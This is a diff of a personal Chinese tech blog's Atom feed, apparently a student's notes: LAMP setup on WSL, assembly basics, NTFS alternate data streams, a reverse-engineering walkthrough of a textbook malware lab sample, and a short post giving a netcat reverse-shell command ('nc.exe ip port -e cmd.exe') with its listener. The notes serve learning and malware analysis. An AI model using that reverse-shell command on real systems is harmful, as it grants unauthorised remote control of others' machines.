@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://18428381824.github.io/"/>
-  <updated>2017-11-29T14:03:32.138Z</updated>
+  <updated>2017-11-29T14:07:18.521Z</updated>
   <id>http://18428381824.github.io/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://18428381824.github.io/2017/11/29/win10linux%20%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85LAMP/"/>
     <id>http://18428381824.github.io/2017/11/29/win10linux 子系统安装LAMP/</id>
     <published>2017-11-28T16:00:00.000Z</published>
-    <updated>2017-11-29T14:03:32.138Z</updated>
+    <updated>2017-11-29T14:07:18.521Z</updated>
     
-    <content type="html"><![CDATA[<p>1.换源</p><pre><code>备份原先的源cp /etc/apt/sources.list /etc/apt/sources.list.bakvim /etc/apt/sources.list换成deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse更新apt-get update    </code></pre><ol><li><p>安装apache2</p><p> apt-get install apache2<br> service apache2 restart<br> 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面</p></li></ol><p>3.安装php</p><pre><code>按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子我找的解决办法是如下：apt-get install software-properties-commonadd-apt-repository ppa:ondrej/phpapt-get updateapt-get install phpapt-get install libapache2-mod-phpservice apache2 restart</code></pre><p>4.测试php</p><pre><code>在/var/www/html目录下新建test.php内容如下：&lt;?phpphpinfo();?&gt;打开localhost/test.php 正常显示则代表成功</code></pre><p>5.至于mysql 的安装，后续再写</p>]]></content>
+    <content type="html"><![CDATA[<p>1.换源</p><pre><code>备份原先的源cp /etc/apt/sources.list /etc/apt/sources.list.bakvim /etc/apt/sources.list换成deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse更新apt-get update    </code></pre><p>2.安装apache2</p><pre><code>apt-get install apache2service apache2 restart 在本地浏览器打开localhost 应该可以看到apache2的欢迎界面</code></pre><p>3.安装php</p><pre><code>按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子我找的解决办法是如下：apt-get install software-properties-commonadd-apt-repository ppa:ondrej/phpapt-get updateapt-get install phpapt-get install libapache2-mod-phpservice apache2 restart</code></pre><p>4.测试php</p><pre><code>在/var/www/html目录下新建test.php内容如下：&lt;?phpphpinfo();?&gt;打开localhost/test.php 正常显示则代表成功</code></pre><p>5.至于mysql 的安装，后续再写</p>]]></content>
     
     <summary type="html">
     
@@ -210,31 +210,6 @@ inform 192.168.1.1
   </entry>
   
   <entry>
-    <title>恶意代码重定向</title>
-    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
-    <published>2017-10-15T16:00:00.000Z</published>
-    <updated>2017-10-25T07:11:55.201Z</updated>
-    
-    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
-      
-    
-    </summary>
-    
-      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
-    
-    
-      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>树莓派透明代理</title>
     <link href="http://18428381824.github.io/2017/10/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86/"/>
     <id>http://18428381824.github.io/2017/10/16/树莓派透明代理/</id>
@@ -260,6 +235,31 @@ inform 192.168.1.1
     
     
       <category term="杂学" scheme="http://18428381824.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>恶意代码重定向</title>
+    <link href="http://18428381824.github.io/2017/10/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+    <id>http://18428381824.github.io/2017/10/16/恶意代码重定向/</id>
+    <published>2017-10-15T16:00:00.000Z</published>
+    <updated>2017-10-25T07:11:55.201Z</updated>
+    
+    <content type="html"><![CDATA[<p>&emsp;1.首先用strings查看字符串，发现<a href="http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：</a></p><pre><code>/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，InternetReadFileInternetCloseHandleInternetOpenUrlAInternetOpenAWININET.dllURLDownloadToCacheFileA </code></pre><p>&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。<br><img src="https://i.imgur.com/ODPMB8W.png" alt=""><br><img src="https://i.imgur.com/qDJ4DI5.png" alt=""><br>这些函数，这些都是重要信息需要关注的。</p><p>&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开’C:\autobat.exe’,失败了调用函数，分析可知是把’<a href="http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，" target="_blank" rel="external">http://www.practicalmalwareanalysis.com/start.htm&#39;,0写入文件C:\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息，</a> 首先搜索&lt;no’字符串，然后调用401000函数，</p><p><img src="https://i.imgur.com/ht0pUfZ.png" alt=""></p><p>&emsp;&emsp;进去分析发现是对&lt;noscript标签的不规则比较，然后对判断是否后面会有<a href="http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。" target="_blank" rel="external">http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。</a></p><p><img src="https://i.imgur.com/akX3WUw.png" alt=""></p><p>&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&amp;emsp;1.首先用strings查看字符串，发现&lt;a href=&quot;http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\autobat.exe，疑似编码用的字符串：&quot; target=&quot;_b
+      
+    
+    </summary>
+    
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -459,21 +459,47 @@ ubuntu系统
   </entry>
   
   <entry>
-    <title>netcat-反向shell</title>
-    <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
-    <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
+    <title>数据隐藏-ADS</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/"/>
+    <id>http://18428381824.github.io/2017/08/06/数据隐藏-ADS/</id>
     <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:12:16.459Z</updated>
+    <updated>2017-08-06T09:08:12.659Z</updated>
     
-    <content type="html"><![CDATA[<p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p><p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p><p>2.linux 主机执行 nc  -l  -p 80</p><p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>]]></content>
+    <content type="html"><![CDATA[<p>数据隐藏的一种方式–ADS</p><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。</p><p>详见<a href="https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin" target="_blank" rel="external">ADS</a></p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
-&lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
-&lt;p&gt;2.linux 主机执行 nc  -l 
+        &lt;p&gt;数据隐藏的一种方式–ADS&lt;/p&gt;
+&lt;p&gt;NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用N
+      
+    
+    </summary>
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>进程替换的一种方式</title>
+    <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
+    <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
+    <published>2017-08-05T16:00:00.000Z</published>
+    <updated>2017-08-06T09:19:12.130Z</updated>
+    
+    <content type="html"><![CDATA[<p>进程替换问题</p><p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p><p><img src="http://i.imgur.com/3u192lY.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;进程替换问题&lt;/p&gt;
+&lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
       
     
     </summary>
@@ -512,21 +538,21 @@ ubuntu系统
   </entry>
   
   <entry>
-    <title>进程替换的一种方式</title>
-    <link href="http://18428381824.github.io/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/"/>
-    <id>http://18428381824.github.io/2017/08/06/进程替换的一种检测方式/</id>
+    <title>netcat-反向shell</title>
+    <link href="http://18428381824.github.io/2017/08/06/netcat%E2%80%94%E5%8F%8D%E5%90%91shell/"/>
+    <id>http://18428381824.github.io/2017/08/06/netcat—反向shell/</id>
     <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:19:12.130Z</updated>
+    <updated>2017-08-06T09:12:16.459Z</updated>
     
-    <content type="html"><![CDATA[<p>进程替换问题</p><p>svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。</p><p><img src="http://i.imgur.com/3u192lY.png" alt=""></p>]]></content>
+    <content type="html"><![CDATA[<p>利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell</p><p>1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe</p><p>2.linux 主机执行 nc  -l  -p 80</p><p>3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;进程替换问题&lt;/p&gt;
-&lt;p&gt;svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/3u192lY.png&quot; alt=&quot;&quot;&gt;&lt;
+        &lt;p&gt;利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell&lt;/p&gt;
+&lt;p&gt;1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe&lt;/p&gt;
+&lt;p&gt;2.linux 主机执行 nc  -l 
       
     
     </summary>
@@ -535,36 +561,6 @@ ubuntu系统
     
     
       <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>汇编知识学习</title>
-    <link href="http://18428381824.github.io/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://18428381824.github.io/2017/08/06/汇编知识学习/</id>
-    <published>2017-08-05T16:00:00.000Z</published>
-    <updated>2017-08-06T09:19:27.891Z</updated>
-    
-    <content type="html"><![CDATA[<p>1.MOVSX  带符号扩展指令</p><pre><code>MOV BL,80H   MOVSX  AX,BLAX=0FF80H因为带符号扩展的时候，高位视为符号位，扩展的高位全置1</code></pre><p>2.neg eax  sbb eax ,eax</p><pre><code>例如 neg rsbb r-rneg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1相当于r-r-cf=-1=oxffffffff注意： MOVzX  无符号扩展指令</code></pre><p>3.test 指令</p><pre><code>test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je  xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je  xxxx</code></pre><p>4.__alloca_probe</p><pre><code>逆向vc编译的程序，经常会看到这样的代码出现在函数头部：mov     eax, xxxxhcall    __alloca_probexxxxh是个立即数，一般大于1000h,即十进制数4096。这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。示例1：                 push    ebp                 mov     ebp, esp                 mov     eax, 8080h                 call    __alloca_probe示例2：                 push    ebp                 mov     ebp, esp                 and     esp, 0FFFFFFF8h                 push    0FFFFFFFFh                 push    offset SEH_4A7AA0                 mov     eax, large fs:0                 push    eax                 mov     large fs:0, esp                 push    ecx                 mov     eax, 8080h                 call    __alloca_probe事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。</code></pre><p>5.chkstk函数</p><pre><code>分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。</code></pre><p>6.JGE.JLE,JNE,JE跳转条件</p><pre><code>JGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转</code></pre><p>7.字符串入栈的操作：</p><pre><code>void main(){01361000  push        ebp  01361001  mov         ebp,esp  01361003  sub         esp,0Ch    //栈顶抬高12个字节01361006  mov         eax,dword ptr [___security_cookie (1363000h)]  0136100B  xor         eax,ebp  0136100D  mov         dword ptr [ebp-4],eax    //用了4个字节  int intA;  char ch[5]=&quot;abcd&quot;;01361010  mov         eax,dword ptr [string &quot;abcd&quot; (136210Ch)] 01361015  mov         cl,byte ptr ds:[1362110h]    //两句传送字符串”abcd\0”到寄存器  intA=15;  fun(intA,ch);0136101B  lea         edx,[ebp-0Ch] //0136101E  push        edx    //数组地址,ch[]0136101F  push        0Fh    //立即数参数,1501361021  push        offset string &quot;Integer:%d String:%s&quot; (13620F4h)  01361026  mov         dword ptr [ebp-0Ch],eax  01361029  mov         byte ptr [ebp-8],cl    //两句语句表示”abcd\0”写入栈中0136102C  call        dword ptr [__imp__printf (13620A0h)]  //调用printf}cl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。</code></pre><p>8.atoi 函数 </p><pre><code>字符串转变为数字</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;1.MOVSX  带符号扩展指令&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;MOV BL,80H   
-MOVSX  AX,BL
-AX=0FF80H
-因为带符号扩展的时候，高位视为符号位，扩展的高位全置1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.neg eax  sbb eax ,eax&lt;
-      
-    
-    </summary>
-    
-      <category term="编程" scheme="http://18428381824.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-    
-      <category term="编程" scheme="http://18428381824.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
     
   </entry>
   
